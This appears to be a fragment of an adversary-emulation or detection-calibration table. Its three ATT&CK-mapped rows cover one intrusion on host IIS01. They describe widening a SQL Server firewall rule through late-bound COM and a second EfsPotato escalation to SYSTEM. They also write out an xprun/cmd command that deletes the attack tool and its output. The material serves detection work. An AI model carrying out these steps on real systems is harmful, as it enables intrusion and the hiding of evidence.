| - | - | - | - | - | - | - | - | - | - | - | - | - |
| FwPolicySvc.exe late-bound COM instantiation of HNetCfg.FwPolicy2 on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `FwPolicySvc.exe` (unsigned PE executed from `C:\ProgramData\` as `NT AUTHORITY\SYSTEM`) loads `FirewallAPI.dll` and instantiates the Windows Firewall policy COM object `HNetCfg.FwPolicy2` via late-bound `IDispatch` in-process on IIS01 - module-load telemetry shows `FirewallAPI.dll` mapped into a non-Microsoft process image and in-process COM activation of the firewall policy object; baseline: only OS and Defender components load `FirewallAPI.dll` on IIS01, and no signed or vendor tool performs late-bound COM activation of the firewall policy object from a user-writable path | Calibrated - Not Benign | - | FwPolicySvc.exe (running as NT AUTHORITY\SYSTEM) instantiates HNetCfg.FwPolicy2 via late-bound COM (IDispatch), loading FirewallAPI.dll into its process to reach INetFwPolicy2/INetFwRules - in-process COM activation, no netsh.exe or cmdlet | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [FwPolicySvc.exe](../resources/payloads/defense-impair/FwPolicySvc/) | - |
| FwPolicySvc.exe sets INetFwRule.Profiles to ALL_PROFILES (0x7FFFFFFF) on the SQL Server (TCP 1433) rule in the Windows Defender Firewall policy store on IIS01 | Defense Impairment | T1686.003 | Disable or Modify System Firewall: Windows Host Firewall | Windows | `FwPolicySvc.exe` (unsigned PE run from `C:\ProgramData\` as `NT AUTHORITY\SYSTEM`) rewrites the `Profiles` mask of the `SQL Server (TCP 1433)` inbound rule on IIS01 from Domain-only to `0x7FFFFFFF` (Domain+Private+Public) - the policy store value under `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules` flips profile scope with no `netsh.exe`, `powershell.exe`, or firewall cmdlet in the process tree | Calibrated - Not Benign | - | `FwPolicySvc.exe` (running as `NT AUTHORITY\SYSTEM`) instantiates `HNetCfg.FwPolicy2` via late-bound COM, resolves the `SQL Server (TCP 1433)` rule through `INetFwRules.Item`, and sets `INetFwRule.Profiles` to `0x7FFFFFFF` - widening the rule from Domain-only to Domain+Private+Public; no `netsh.exe`, no `powershell.exe`, no firewall cmdlet on any command line | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [FwPolicySvc.exe](../resources/payloads/defense-impair/FwPolicySvc/) | - |
| CertEnrollSvc.exe SYSTEM escalation deletes fwp_out.txt and FwPolicySvc.exe from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe` as `NT AUTHORITY\SYSTEM` - same escalation chain as the Step 4 cleanup row but deleting the tool and its output; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe" lsarpc` - second EfsPotato escalation required because both files are owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token → `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |

---
